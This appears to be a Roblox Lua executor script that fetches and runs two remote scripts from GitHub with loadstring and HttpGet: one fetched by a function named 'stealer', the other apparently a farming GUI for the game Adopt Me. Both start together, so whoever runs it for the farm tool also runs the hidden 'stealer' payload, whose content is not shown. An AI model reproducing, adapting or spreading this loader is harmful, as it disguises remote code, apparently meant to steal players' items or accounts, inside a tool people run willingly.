local function stealer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/dff/refs/heads/main/script.lua",true))()
end
local function farm()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/4doptme/refs/heads/main/gui.lua",true))()
end

task.spawn(stealer)
task.spawn(farm)
